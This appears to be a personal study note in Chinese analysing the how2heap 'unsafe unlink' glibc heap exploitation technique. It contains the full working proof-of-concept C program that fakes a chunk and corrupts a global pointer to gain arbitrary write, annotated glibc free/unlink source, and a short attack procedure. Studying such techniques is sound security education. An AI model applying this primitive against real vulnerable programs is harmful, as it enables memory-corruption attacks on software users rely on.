# 源码
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
    setbuf(stdout, NULL);
    printf("Welcome to unsafe unlink 2.0!\n");
    printf("Tested in Ubuntu 20.04 64bit.\n");
    printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
    printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

    int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
    int header_size = 2;

    printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

    printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    printf("We create a fake chunk inside chunk0.\n");
    printf("We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n");

    chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;

    printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");

    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);

    printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
    printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");

    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

    printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
    printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

  

    printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");

    uint64_t *chunk1_hdr = chunk1_ptr - header_size;

    printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
    printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");

    chunk1_hdr[0] = malloc_size;

    printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
    printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");

    chunk1_hdr[1] &= ~1;

    printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
    printf("You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n");

    free(chunk1_ptr);

  
/*unlink利用到此结束*/
    printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");

    char victim_string[8];

    strcpy(victim_string,"Hello!~");

    chunk0_ptr[3] = (uint64_t) victim_string;

    printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
    printf("Original value: %s\n",victim_string);

    chunk0_ptr[0] = 0x4141414142424242LL;

    printf("New Value: %s\n",victim_string);

    // sanity check
    assert(*(long *)victim_string == 0x4141414142424242L);
}
```
这个利用，通过free一个被修改的large bin的chunk调用`unlink()`函数，对**写有chunk地址的任意地址内存**写其之前`0x8*3`的地址值。一般用来控制.bss段的指针数组，从而进行任意地址写。
# glibc源码与伪造chunk

```
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
	......
if (!prev_inuse(p)) {
	/*对inuse标志位的检测*/
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
	......
}
static void
unlink_chunk (mstate av, mchunkptr p)
{
/*对next chunk的prev_seze与current chunk的size位一致性检测*/
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;

/*这里伪造fd与bk指针，使d->bk、bk->fd指向同一地址，且其值位p*/
  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");

  fd->bk = bk;
  /*最后写入的是伪造的fd指针*/
  bk->fd = fd;
  
  /*申请large chunk不进入*/
  if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
    {
     ......
}
```
以上是漏洞主要利用的代码，下面是free前后内存状态。（需覆写inuse位为0，或uaf）
![[notes/pwn/堆利用/how2heap源码分析/2.35/unsafe_unlink/图/屏幕截图 2026-02-07 235302.png]]
free后
![[notes/pwn/堆利用/how2heap源码分析/2.35/unsafe_unlink/图/屏幕截图 2026-02-08 000842.png]]
# 攻击流程
1. 需要有常规逻辑的指针数组。
2. 如上构造堆区（至少需要off-by-one修改inuse位为0，或uaf）
3. `free(chunk2)`即可
这里申请size为0x420主要为了不free进tcache和fastbin中，若能达成这个要求，其他大小也行。